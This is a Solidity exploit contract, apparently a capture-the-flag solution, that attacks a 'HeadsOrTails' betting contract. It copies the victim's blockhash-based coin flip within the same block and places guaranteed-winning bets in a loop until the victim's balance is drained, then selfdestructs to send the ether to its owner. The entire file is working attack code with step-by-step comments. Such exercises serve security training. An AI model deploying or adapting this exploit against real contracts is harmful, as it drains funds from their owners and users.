pragma solidity 0.4.24;

import "./HeadsOrTails.sol";

contract HeadsOrTailsExploit
{
    address public owner;
    address public victim_addr;
    
    constructor(address addr)
    {
        //Remember our wallet address
        owner=msg.sender;
        //Rememberthe victim contract
        victim_addr = addr;
    }
    
    function () payable {} //Ensure we can get paid (very important)
    
    function exploit() external payable
    {
        //Remember to authorize this exploit contract with the CtfFramework before running this exploit
        
        //First, we calculate the same entropy as the victim contract
        bytes32 entropy = blockhash(block.number-1);
        bytes1 coinFlip = entropy[0] & 1;
        
        //Because our guess is calculated by us and validated by the victim contract in the same block, we are guaranteed to win
        
        //while the victim still has ether left 
        while(address(victim_addr).balance > 0)
        {
            //Send our guaranteed win
            HeadsOrTails(victim_addr).play.value(.1 ether)(coinFlip == 1);
        }
        
        //Send ourselves the profits
        selfdestruct(owner);
    }
}
